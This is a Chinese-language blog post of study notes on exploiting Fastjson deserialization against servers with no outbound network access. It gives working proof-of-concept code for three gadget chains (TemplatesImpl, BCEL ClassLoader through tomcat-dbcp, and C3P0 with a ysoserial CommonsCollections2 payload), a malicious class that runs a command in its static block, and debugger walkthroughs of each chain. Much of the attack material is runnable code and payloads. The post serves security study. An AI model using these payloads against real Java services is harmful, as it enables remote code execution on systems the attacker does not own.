---
title: Fastjson不出网利用
date: 2026-11-19
---

# Fastjson不出网利用

## 前言

Fastjson 是面试时非常经典、面试官也非常喜欢问的一环，而除了 Fastjson 的基本利用之外也有面对服务端不出网的情况，这种情况在红队之类的面试也很经常会问的，所以在这里记录一下常见了利用手法以及链子。

## 不出网

不出网指的是**目标服务器无法主动向攻击者控制的外部服务器发起网络请求**，大致可以分为完全不出网和不完全出网。完全不出网就是目标服务器完全无法向外部发起网络连接，不管什么协议都不行；而不完全出网就是少数协议被限制无法发起网络连接，或者仅限目标服务器能通过少数协议向外部发起网络连接。比如服务器限制了不能向外部建立 LDAP 连接，但是 ICMP 协议能出网。

而在 Fastjson 的场景下，如果目标服务器不出网，那么我们最经典的 JNDI 注入的攻击方式就无法实现。而不出网利用的核心思路，就是**把恶意 payload 直接放到 Fastjson 的 JSON 数据中，让目标在本地解析、加载并执行，全程不需要它主动对外建立连接。**

## 利用方式

### TemplatesImpl 利用链

之前学习 CC 链和 Fastjson 1.2.24 版本的利用时都涉及到这条利用链了，所以这里也不记录具体的利用链，直接上 POC。

本地就用 Fastjson 1.2.24 版本进行复现，这个版本的利用更加简单。

但是这种利用的条件比较严格：

1. 服务端使用`parseObject()`时，需要使用`JSON.parseObject(input, Object.class, Feature.SupportNonPublicField);`
2. 服务端使用`parse()`时，需要使用`JSON.parse(text1,Feature.SupportNonPublicField)`

这是因为`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`这个类需要赋值的一些属性为`private`，而且没有对应的`setter`，所以如果是在真实场景下利用它就是纯看运气了。

先写好恶意类：

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.IOException;

public class Calc extends AbstractTranslet {
    public Calc() {
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }

    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
```

编译好之后对这个 class 文件进行 base64 编码，然后直接放到 poc 中：

```java
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

public class Poc {
    public static void main(String[] args) {
        String poc="{\n" +
                "    \"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n" +
                "    \"_bytecodes\": [\"base64编码之后的payload\"],\n" +
                "    '_name': 'a.b',\n" +
                "    '_tfactory': {},\n" +
                "    \"_outputProperties\": {},\n" +
                "    \"_name\": \"b\",\n" +
                "    \"_version\": \"1.0\",\n" +
                "    \"allowedProtocols\": \"all\"\n" +
                "}\n";

        Object o = JSON.parseObject(poc, Object.class, Feature.SupportNonPublicField);
        System.out.println(o);
    }
}
```

使用 base64 来传输是因为底层 Fastjson 会调用`IOUtils.decodeBase64()`来进行解码，而如果直接传 class 文件的内容会破坏 JSON 的格式，Fastjson 也无法正确解析出字节数组。

当然我们也可以利用这个利用链来写入内存马。

### BCEL 利用链

这种利用方式是 Fastjson 最经典也最好用的一种方法。

#### BCEL 简介

BCEL 即 Apache Commons BCEL 字节码工程库，它是一个用来分析、创建和操作 Java 的 class 文件的工具库。BCEL 其实就是和 ASM、Javassist 还有 ByteBuddy 一样的字节码操作工具，只不过各个工具的工作层面不同。 BCEL 工作在 **JVM 指令层面**，我们可以操作每一条 JVM 指令。

#### 利用

BCEL 对应的包在老版本 JDK 中是内置的，直到 JDK8u251 之后这个包才被删除了。所以在实战中如果目标服务器的 JDK 版本较低是比较好利用的，到高版本除非目标导入了 BCEL 的依赖，否则无法利用。

BCEL ClassLoader 有一个特殊能力：能够识别`$$BCEL$$`开头的字符串，把后面的内容解码成字节码直接加载，整个过程是在本地完成的，不需要任何网络连接。

实际在利用的时候是需要目标导入了 tomcat 的相关依赖的：

```xml
<dependency>
	<groupId>org.apache.tomcat</groupId>
	<artifactId>tomcat-dbcp</artifactId>
	<version>9.0.20</version>
</dependency>
```

先对 POC 的字节码转化为 BCEL：

```java
package org.example;

import com.sun.org.apache.bcel.internal.classfile.Utility;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class BCELpoc {
    public static void main(String[] args) throws Exception {
        Path path = Paths.get("D:\\JavaSecTestCode\\fasjson\\fastjsonUnNet\\src\\main\\java\\Evil.class");
        byte[] bytes = Files.readAllBytes(path);
        String result = Utility.encode(bytes, true);
        BufferedWriter bw = new BufferedWriter(new FileWriter("res.txt"));
        bw.write("$$BCEL$$"+result);
        bw.close();
    }
}
```

对应的恶意类：

```java
public class Evil {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}
```

最终 POC：

```json
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

import java.nio.file.Files;
import java.nio.file.Paths;

public class Poc {
    public static void main(String[] args) throws Exception {
        String bcel = new String(Files.readAllBytes(Paths.get("D:\\JavaSecTestCode\\fasjson\\fastjsonUnNet\\res.txt")));

        String poc = "{ {\n" +
                "    \"x\": {\n" +
                "        \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "        \"driverClassLoader\": {\n" +
                "            \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "        },\n" +
                "        \"driverClassName\": \"" + bcel + "\"\n" +
                "    }\n" +
                "} : \"x\" }";

        Object o = JSON.parse(poc, Feature.SupportNonPublicField);
        System.out.println(o);
    }
}
```

#### 利用链分析

##### Fastjson 的一些重要的小特性

在调试分析之前，需要先了解一些关于 Fastjson 的一些小特性。

Fastjson 中的`parse()`和`parseObject()`都可以用来将 JSON 字符串反序列化成 Java 对象，`parseObject()`本质上也是调用`parse()`进行反序列化的，但是`parseObject()`会额外地将 Java 对象转化为`JSONObject`对象，即调用`JSON.toJSON`。所以反序列化时的区别就在于，`parse()`会识别并调用目标类的`setter`和某些符合条件的`getter`方法，而`parseObject()`由于多执行了`JSON.toJSON(obj)`，所以在处理过程中会调用反序列化目标类的**所有**`setter`和`getter`。

而黑盒的情况下我们也不知道后端调用的到底是`parse()`还是`parseObject()`，所以我们需要找到一种能同时兼容这两个方法的办法，也就要找到一种方法让其可以在反序列化的过程中调用到`JSON.toString()`。

为什么需要找`JSON.toString()`？实际上真正想要利用的是`JSONObject.toString()`，`JSONObject`中其实并没有实现`toString()`方法，但是它继承了`JSON`类，也继承了`toString()`方法，而`JSON.toString()`方法中则调用了`toJSONString()`，也就是序列化的过程，而序列化的过程本质上就是遍历对象的**所有**`getter`来提取属性值。

这就意味着：只要我们能在反序列化的过程中，让 Fastjson 对一个包含了恶意对象的`JSONObject`调用`toString()`，我们就可以利用某些`getter`来进行一些操作了。

##### POC 分析

我们针对这个 POC 来分析。

首先看我们需要的进行反序列化的类`org.apache.tomcat.dbcp.dbcp2.BasicDataSource`，找到`driverClassLoader`和`driverClassName`对应的`setter`或者`getter`。

```java
public synchronized void setDriverClassLoader(final ClassLoader driverClassLoader) {
    this.driverClassLoader = driverClassLoader;
}
```

```java
public synchronized void setDriverClassName(final String driverClassName) {
    if (driverClassName != null && driverClassName.trim().length() > 0) {
        this.driverClassName = driverClassName;
    } else {
        this.driverClassName = null;
    }
}
```

先看一下`setDriverClassLoader`方法，方法签名中传入的参数是一个类对象，所以我们在反序列化的时候要先用`@type`来实例化一个类，不然无法正常运行。

在 POC 中我们传入的参数是`com.sun.org.apache.bcel.internal.util.ClassLoader`，就会被注入到其中。而我们构造的 BCEL 字节码也会被注入到`driverClassName`。

整个攻击分为两个阶段：`setter`赋值以及`getter`触发。

上面的分析就是我们的`setter`赋值阶段，而`getter`触发依赖于 Fastjson 的自动扫描机制。

当 Fastjson 在反序列化完成后，它会寻找符合条件的`getter`并主动调用。对于`parseObject()`方法，由于这个方法在反序列化之后会额外执行一步`JSON.toJSON()`，这个方法会触发目标类的**所有**`getter`。

而`parse()`方法只会调用一些符合特殊条件的`getter`。

**注：但是我的 payload 在这里并不是通过 getter 来触发攻击的。**

仔细观察成功的 payload，实际上是一个嵌套的 JSON 作为了 key。如果我用`{{...}: "x"}`这种写法，不管是使用`parse()`还是`parseObject()`，Fastjson 在处理这个 key 的时候都会对它调用`toString`方法。如果是使用`parse()`方法，Fastjson 在反序列化时生成了一个`JSONObject`，而`JSONObject`放到 JSON 的 key 的位置上时，在 JSON 反序列化的时候，Fastjson 又会对 JSON key 自动调用`toString()`方法，从而调用`getter`方法。

`toString()`底层会触发序列化逻辑，序列化的过程会遍历并调用目标对象的`getter`，所以`getConnection`就是这样被调用出来的。

接下来看一下后续是怎么调用的。

我们断点就打在`org.apache.tomcat.dbcp.dbcp2.BasicDataSource#getConnection()`方法这里：

![屏幕截图2026-11-19 215939](/images/screenshots/屏幕截图2026-11-19-215939.png)

会直接跳到最后一行，我们跟进到`createDataSource()`来看一下。

![屏幕截图2026-11-20 140244](/images/screenshots/屏幕截图2026-11-20-140244.png)

走到`createConnectionFactory()`这里，跟进去。

![屏幕截图2026-11-20 140450](/images/screenshots/屏幕截图2026-11-20-140450.png)

到这就很明显了，直接通过反射调用来加载我们传入的 BCEL 字节码并使用 BCEL 类加载器来加载，而且也会加载完类后直接初始化，由于我的 payload 是写在静态代码块中的，实际上类加载之后就已经执行了。

当然也有通过 BCEL 写入内存马的方法，这里就不记录了。

### C3P0 利用链

#### 简介

C3P0 是一个开源的 JDBC 连接池，它实现了数据源与 JNDI 绑定，支持 JDBC3 规范和 JDBC2 的标准扩展。使用它的开源项目有 Hibernate、Spring 等。

JDBC 是 Java DataBase Connectivity 的缩写，它是 Java 程序访问数据库的标准接口。

使用 Java 程序访问数据库时，Java 代码并不是直接通过 TCP 连接去访问数据库，而是通过 JDBC 接口来访问，而 JDBC 接口则通过 JDBC 驱动来实现真正对数据库的访问。连接池类似于线程池，在一些情况下我们会频繁地操作数据库，此时 Java 在连接数据库时会频繁地创建或者销毁句柄，增大资源的消耗。为了避免这样一种情况，我们可以提前创建好一些连接句柄，需要使用时直接使用句柄，不需要时可以将其放回连接池中，以便下一次使用。类似这样一种能够复用句柄的技术就是池技术。

#### 利用

C3P0 首先需要依赖对应的包：

```xml
<dependency>
  <groupId>org.apache.commons</groupId>
  <artifactId>commons-collections4</artifactId>
  <version>4.0</version>
</dependency>
<dependency>
  <groupId>com.mchange</groupId>
  <artifactId>c3p0</artifactId>
  <version>0.9.5.2</version>
</dependency>
```

核心依赖还是 C3P0 的包，CommonsCollections 的不是必需，但是相对来说更好用。

先写一下 POC。

先用 yso 把 CC2 的 payload 写出来：

```bash
java -jar ysoserial-all.jar CommonsCollections2 "calc" > calc.ser
```

再写一个 POC：

```java
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

import java.io.FileInputStream;
import java.io.InputStream;

public class C3P0poc {
    public static void main(String[] args) throws Exception{
        FileInputStream in = new FileInputStream("D:\\tools\\WebTools\\calc.ser");
        byte[] data = toByteArray(in);
        in.close();
        String hexString = bytesToHex(data, data.length);
        String poc = "{\"f\":{\"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"," +
        "\"userOverridesAsString\":\"HexAsciiSerializedMap:" + hexString + ";\"}}";

        Object o = JSON.parseObject(poc, Object.class, Feature.SupportNonPublicField);
    }

    public static byte[] toByteArray(InputStream in) throws Exception {
        byte[] classBytes;
        classBytes = new byte[in.available()];
        in.read(classBytes);
        in.close();
        return classBytes;
    }

    public static String bytesToHex(byte[] bArray,int length){
        StringBuffer sb = new StringBuffer(length);
        for (int i = 0; i < length; i++) {
            String sTemp = Integer.toHexString(255 & bArray[i]);
            if(sTemp.length()<2){
                sb.append(0);
            }
            sb.append(sTemp.toUpperCase());
        }

        return sb.toString();
    }
}
```

能够成功弹出计算器。

#### 利用链分析

对着这个 payload 进行分析。

这里反序列化的类是`com.mchange.v2.c3p0.WrapperConnectionPoolDataSource`，而期望调用的方法是`setUserOverridesAsString()`，实际上这个方法是`WrapperConnectionPoolDataSource`这个类的父类`WrapperConnectionPoolDataSourceBase`实现的，可以看一下源码：

```java
public synchronized void setUserOverridesAsString( String userOverridesAsString ) throws PropertyVetoException
{
    String oldVal = this.userOverridesAsString;
    if ( ! eqOrBothNull( oldVal, userOverridesAsString ) )
       vcs.fireVetoableChange( "userOverridesAsString", oldVal, userOverridesAsString );
    this.userOverridesAsString = userOverridesAsString;
}
```

断点打在这个`setter`这里看一下后续的攻击是怎么实现的。

![屏幕截图2026-11-21 124155](/images/screenshots/屏幕截图2026-11-21-124155.png)

跟进到`vcs.fireVetoableChange( "userOverridesAsString", oldVal, userOverridesAsString );`这一行。然后走到`fireVetoableChange()`方法。

![屏幕截图2026-11-21 125514](/images/screenshots/屏幕截图2026-11-21-125514.png)

前面是把解析后的数据给提取出来以及一些赋值，一直到这里：

![屏幕截图2026-11-21 125704](/images/screenshots/屏幕截图2026-11-21-125704.png)

跟进去，自动跳到了`setUpPropertyListeners()`这个方法。

![屏幕截图2026-11-21 130008](/images/screenshots/屏幕截图2026-11-21-130008.png)

走到这里然后跟进去。

![屏幕截图2026-11-21-131744](/images/screenshots/屏幕截图2026-11-21-131744.png)

这里先把我们的 Hex 字符串提取出来，然后还原成字节数组，再进行反序列化，跟进到`fromByteArray()`方法。

![屏幕截图2026-11-21-132056](/images/screenshots/屏幕截图2026-11-21-132056.png)

跟进到`deserializeFromByteArray()`方法。

```java
public static Object deserializeFromByteArray(byte[] bytes) throws IOException, ClassNotFoundException
{
	ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bytes));
	return in.readObject();
}
```

很明显了，这里对我们传入的字节数组进行了反序列化，从而执行了我们的恶意代码，触发了 CC2 的链子。

这种利用方法也叫做二次反序列化，第一次反序列化是 Fastjson 处理 JSON 数据时进行的 JSON 反序列化，然后把我们的恶意字节码传到目标上面，然后又利用 C3P0 来实现 JDK 原生的反序列化利用。

当然我们也可以利用`TemplatesImpl`这个利用链来打，这样不需要其他的第三方依赖，但是到高版本的 Fastjson 就无法利用了。

## 总结

当然还有其他不出网的利用方式，比如通过`commons-io`来向目标网站写入 webshell 等，这里就不作学习了，只记录常用的三种利用方式以及对应的利用链的分析。其实总体看下来还是比较简单的，主要思路就是把我们构造好的恶意字节码或者序列化数据放到 payload 中然后发送给目标服务器，让目标服务器加载本地的类来实现攻击。









































